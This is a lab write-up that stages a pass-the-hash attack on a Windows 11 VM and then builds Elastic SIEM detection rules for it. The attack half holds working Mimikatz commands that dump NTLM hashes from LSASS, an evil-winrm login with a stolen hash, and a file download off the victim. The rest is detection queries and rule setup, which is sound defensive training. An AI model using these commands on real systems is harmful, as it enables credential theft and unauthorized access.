# Pass the Hash Attack 

<br />

<p align="center">
<img src="https://i.imgur.com/u80FCmz.png" height="50%" width="50%" alt="Detection Engineering Logo Team Ghost"/>
</p>


<h2>Description</h2>

A Pass-the-Hash (PtH) attack is a cybersecurity exploit where an attacker steals hashed credentials (password hashes) and uses them to authenticate and gain unauthorized access to network resources without cracking the hashes.

In this section of the project we are going to execute a pass the hash attack by utilizing Mimikatz to steal the password hash of an Administrator account. Then we are going to utilize "EvilWinRM" to log into the Windows VM and exfiltrate some data. 

</br>

<h2>Pass the Hash Attack</h2>

<h3>Attack Setup:</h3>

The first step we need to take to setup this attack is to create a new user on our Windows 11 VM. To do this go to your windows settings and select "Accounts". Afterwards, select the option named "Other Users" and click on the blue "Add Account" button. Next, select "I dont have this person's sign in information" and then click on "Add a user without Microsoft Account". Proceed to enter in the information to create an account.

<p align="center">
<img src="https://i.imgur.com/Hq8VoJo.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

After you have created your account the next thing we need to do is to change the account type to "Administrator". To do this open up "Control Panel" and select the "User Accounts" option. Then select the "Manage another account" option and look for the user account you just created. Select your user account and select the "Change the account type" option. Finally, select the "Administrator" option and save. 

Next, log into the user account and save the .txt file I have provided in the Documents folder. This is the file we are going to exfiltrate. 

<p align="center">
<img src="https://i.imgur.com/1iNDFMm.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>


Now that we have our user account created we will proceed to enable Winrm and add the user account to the "Remote Management Users" group. To do this execute these powershell commands:

```powershell

winrm quickconfig

```

```powershell

Add-LocalGroupMember -Group "Remote Management Users" -Member "Enter your user account here"

```
<p align="center">
<img src="https://i.imgur.com/gbFnbVx.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally, we need to download Mimikatz on our Windows 11 VM. To do this visit this website https://github.com/ebalo55/mimikatz and download the repository by clicking on the green "Code" button and selecting "Download ZIP". Extract the contents of the zip file and the executable for mimikatz will be inside the "x64" folder.

<p align="center">
<img src="https://imgur.com/ujsZYj6.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

We are now ready to launch the attack.

</br>

<h3>Attack Execution:</h3>

The first thing we need to do to execute this attack is to make sure that the Administrator account is logged in. To do this simply log into the user account we created and then switch back to the main "Users" account. 

Afterwards, proceed to launch mimikatz.exe as Administrator and execute these commands:

```powershell

privilege::debug

```

```powershell

sekurlsa::logonpasswords full

```

These commands retrieve detailed information about all logged-on user sessions, including plaintext passwords, NTLM hashes, and Kerberos tickets. Scroll up until you see the user account that you created. Afterwards, look for the "NTLM" field and copy the value. This value is our hashed password that we set when we created this user account.

<p align="center">
<img src="https://imgur.com/5svIqfT.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

The next step is to use EvilWinrm to connect to our Windows 11 VM and exfiltrate some data. To do this fire up your Kali Linux VM and open up a terminal then enter in these commands:

```bash
sudo evil-winrm -i 192.168.1.4 -u YourUserName -H YourHashValue
```

```bash
download C:\Users\YourUserAccount\Documents\ValuableData.txt ./ValuableData.txt
```

You should now have this .txt file on your Kali Linux VM.

<p align="center">
<img src="https://imgur.com/f88J0z4.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

We are now ready to create our detection for this attack.


</br>

<h2>Mimikatz, Network Logon, & WinRM Detection</h2>

This detection is going to be a bit different because we are going to create 3 different detection rules that will be the bases of our main detection rule.

<h3>Mimikatz Detection Query:</h3>

In order to create the query to detect mimikatz we are going to have to look for logs related to mimikatz in our Elastic environment. After some research this is the query that we are going to use for our detection rule:

data_stream.dataset : "windows.sysmon_operational" and process.name : "mimikatz.exe" and winlog.event_data.Description : "mimikatz for Windows" and message : *mimikatz*

- data_stream.dataset : "windows.sysmon_operational" looks for logs that have the windows.sysmon_operational dataset.
- process.name : "mimikatz.exe" looks for logs that have the process mimikatz.exe
- winlog.event_data.Description : "mimikatz for Windows" looks for logs that contain "mimikatz for Windows" as the event data description
- message : *mimikatz* looks for logs that contains the work "mimikatz" in the message field

<p align="center">
<img src="https://imgur.com/IGQwXGV.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Now that we have our query we are going to proceed to create our detection rule.

</br>

<h3>Mimikatz Detection Rule</h3>

<b>Define Rule:</b>

Now that we have our query we are now going to create our detection rule. To do this copy the query and click on the hamburger icon on the top-left corner of the page. Scroll down to "Security" and select the "Rules" option. Afterwards click on "Detection Rules (SIEM)" and then select "Create New Rule". Make sure that the "Custom Query" option is selected then scroll down and paste our query. Next scroll down to the "Suppress alerts by" option and enter in "host.id". Then select "Per time period" and select 5 minutes. What this will do is reduce the noise generated by repetitive alerts by grouping similar alerts together.

<p align="center">
<img src="https://imgur.com/h5qfNFA.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>About Rule:</b>

Next we are going to fill out the About Rule section. We are going to name the alert "Mimikatz has been detected on endpoint!" and enter in a description for the rule. Set the "Default severity" to "High" then click on "Advance Settings". Scroll down to until you see "MITRE ATT&CK threats" and select the option for "Credential Access" for the technique and then add a subtechnique and set it to "OS Credential Dumping". Finally add another subtechnique and set it to "LSASS Memory".

<p align="center">
<img src="https://imgur.com/33uA9kz.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://imgur.com/YKlXNxB.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will set the duration for how long the rule should run. We will set the rule to run every 5 minutes with a look-back time of 5 minutes. You can adjust this however you'd like.

<p align="center">
<img src="https://i.imgur.com/3cM7k5K.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we can set what action Elastic should take when this rule triggers. We can set it to send an email, send a message with slack, use microsoft teams etc. For this project we dont have to set it to anything simply click on the "Create & Enable rule" button.

<p align="center">
<img src="https://i.imgur.com/8Hm9GXc.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set our rule we can then execute mimikatz and this should trigger the alert. We can view the alert by going to "Security" and selecting the "Alerts" option.

</br>

<h3>Network Logon Query:</h3>

In order to create the query to detect network logons we are going to have to look for logs related to logon type 3 in our Elastic environment. After some research this is the query that we are going to use for our detection rule : 

data_stream.dataset : "system.security" and event.code : "4624" and winlog.event_data.LogonType : "3"

- data_stream.dataset : "system.security" filters the logs to include only those from the system.security dataset.
- event.code : "4624" filters the logs to include only events with the code 4624, which indicates a successful logon.
- winlog.event_data.LogonType : "3" further filters the logs to include only logon events with a LogonType of 3, which represents a network logon


<p align="center">
<img src="https://imgur.com/qe2oIWf.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Now that we have our query we are going to proceed to create our detection rule.

</br>

<h3>Network Logon Detection Rule</h3>

<b>Define Rule:</b>

Now that we have our query we are now going to create our detection rule. To do this copy the query and click on the hamburger icon on the top-left corner of the page. Scroll down to "Security" and select the "Rules" option. Afterwards click on "Detection Rules (SIEM)" and then select "Create New Rule". Make sure that the "Custom Query" option is selected then scroll down and paste our query. Next scroll down to the "Suppress alerts by" option and enter in "host.id". Then select "Per time period" and select 5 minutes. What this will do is reduce the noise generated by repetitive alerts by grouping similar alerts together.

<p align="center">
<img src="https://imgur.com/zMuYOoX.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>About Rule:</b>

Next we are going to fill out the About Rule section. We are going to name the alert "A Network Logon to this machine has been detected" and enter in a description for the rule. Set the "Default severity" to "Medium" then click on "Advance Settings". Scroll down to until you see "MITRE ATT&CK threats" and select the option for "Initial Access" for the technique and then add a subtechnique and set it to "Valid Accounts". Finally add another subtechnique and set it to "Local Accounts".

<p align="center">
<img src="https://imgur.com/nUaKPbn.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://imgur.com/S6U0pdG.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will set the duration for how long the rule should run. We will set the rule to run every 5 minutes with a look-back time of 5 minutes. You can adjust this however you'd like.

<p align="center">
<img src="https://i.imgur.com/3cM7k5K.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we can set what action Elastic should take when this rule triggers. We can set it to send an email, send a message with slack, use microsoft teams etc. For this project we dont have to set it to anything simply click on the "Create & Enable rule" button.

<p align="center">
<img src="https://i.imgur.com/8Hm9GXc.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set our rule we can then execute a network logon and this should trigger the alert. We can view the alert by going to "Security" and selecting the "Alerts" option.

</br>

<h3>Winrm Query:</h3>

In order to create the query to detect WinRM connections we are going to have to look for logs related WinRM in our Elastic environment. After some research this is the query that we are going to use for our detection rule : 

destination.port : "5985" and zeek.http: * and user_agent.original : "Ruby WinRM Client (2.8.3, ruby 3.1.2 (2022-04-12))" and url.path : "/wsman"

- destination.port : "5985" filters the logs to include only those with a destination port of 5985, which is commonly used for Windows Remote Management (WinRM) over HTTP.
- zeek.http: * includes all logs that have HTTP traffic data captured by Zeek.
- user_agent.original : "Ruby WinRM Client (2.8.3, ruby 3.1.2 (2022-04-12))" filters logs where the user agent string matches the specified Ruby WinRM Client version.
- url.path : "/wsman" filters logs to include only those with a URL path of /wsman, which is used by WinRM.

<p align="center">
<img src="https://imgur.com/ouooHc2.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Now that we have our query we are going to proceed to create our detection rule.

</br>

<h3>WinRM Detection Rule</h3>

<b>Define Rule:</b>

Now that we have our query we are now going to create our detection rule. To do this copy the query and click on the hamburger icon on the top-left corner of the page. Scroll down to "Security" and select the "Rules" option. Afterwards click on "Detection Rules (SIEM)" and then select "Create New Rule". Make sure that the "Custom Query" option is selected then scroll down and paste our query. Next scroll down to the "Suppress alerts by" option and enter in "source.ip". Then select "Per time period" and select 10 minutes. What this will do is reduce the noise generated by repetitive alerts by grouping similar alerts together.

<p align="center">
<img src="https://imgur.com/7BhUY7y.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>About Rule:</b>

Next we are going to fill out the About Rule section. We are going to name the alert "WinRM Connection Detected" and enter in a description for the rule. Set the "Default severity" to "High" then click on "Advance Settings". Scroll down to until you see "MITRE ATT&CK threats" and select the option for "Initial Access" for the technique and then add a subtechnique and set it to "External Remote Services".

<p align="center">
<img src="https://i.imgur.com/8p6HCHV.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://imgur.com/VRZ7lOu.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will set the duration for how long the rule should run. We will set the rule to run every 5 minutes with a look-back time of 5 minutes. You can adjust this however you'd like.

<p align="center">
<img src="https://i.imgur.com/3cM7k5K.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we can set what action Elastic should take when this rule triggers. We can set it to send an email, send a message with slack, use microsoft teams etc. For this project we dont have to set it to anything simply click on the "Create & Enable rule" button.

<p align="center">
<img src="https://i.imgur.com/8Hm9GXc.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set our rule we can then execute EvilWinrm and this should trigger the alert. We can view the alert by going to "Security" and selecting the "Alerts" option.

</br>

Now that we have created these 3 detection rule we are ready to proceed to create our main detection rule.

<p align="center">
<img src="https://i.imgur.com/SOC7kG1.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<h2>Pass the Hash Detection</h2>

<h3>Pass the Hash Query:</h3>

In order to create our query we are going to utilize the query language "Event Query Language" or EQL. Event Query Language (EQL) is a specialized query language designed for event-based data, allowing users to search, filter, and correlate events efficiently. It is particularly useful in cybersecurity for detecting patterns and sequences of events that signify potential security incidents.

The EQL query that we will be using for this detection rule is :

```SQL
sequence with maxspan = 10m
  [any where kibana.alert.rule.name == "A Network Logon to this machine has been detected"]
  [any where kibana.alert.rule.name == "WinRM Connection Detected"]
  [any where kibana.alert.rule.name == "Mimikatz has been detected on endpoint!"]
```

This EQL query is used to correlate these three alerts within a 10-minute window to identify potential Pass-the-Hash attacks, where an attacker might use a combination of network logons, WinRM connections, and tools like Mimikatz to compromise a system.

Now that we have our query we will now proceed to create our detection rule.

</br>

<h3>Pass the Hash Detection Rule</h3>

<b>Define Rule:</b>

Now that we have our query we are now going to create our detection rule. To do this copy the query and click on the hamburger icon on the top-left corner of the page. Scroll down to "Security" and select the "Rules" option. Afterwards click on "Detection Rules (SIEM)" and then select "Create New Rule". Make sure that the "EQL" option is selected then scroll down and paste our query.

<p align="center">
<img src="https://imgur.com/6SNUnZM.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>About Rule:</b>

Next we are going to fill out the About Rule section. We are going to name the alert "A Pass the Hash Attack Detected" and enter in a description for the rule. Set the "Default severity" to "Critical" then click on "Advance Settings". Scroll down to until you see "MITRE ATT&CK threats" and select the option for "Lateral Movement" for the technique and then add the subtechniques "Remote Services" and "Windows Remote Management".  Next add another MITRE technique and set it to "Initial Access" then add the subtechniques "Valid Accounts" and "Local Accounts". Finally, add a last MITRE technique and set it to "Credential Access" then add the subtechniques "OS Credential Dumping" and "LSASS Memory". 

<p align="center">
<img src="https://i.imgur.com/8p6HCHV.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://imgur.com/TTQW0XI.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will set the duration for how long the rule should run. We will set the rule to run every 5 minutes with a look-back time of 5 minutes. You can adjust this however you'd like.

<p align="center">
<img src="https://i.imgur.com/3cM7k5K.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we can set what action Elastic should take when this rule triggers. We can set it to send an email, send a message with slack, use microsoft teams etc. For this project we dont have to set it to anything simply click on the "Create & Enable rule" button.

<p align="center">
<img src="https://i.imgur.com/8Hm9GXc.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set our rule we can then execute the Pass the Hash attack and this should trigger the alert. We can view the alert by going to "Security" and selecting the "Alerts" option. The result should look like this:

<p align="center">
<img src="https://imgur.com/ikEMsII.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<h3>Pass the Hash Attack Complete!</h3>





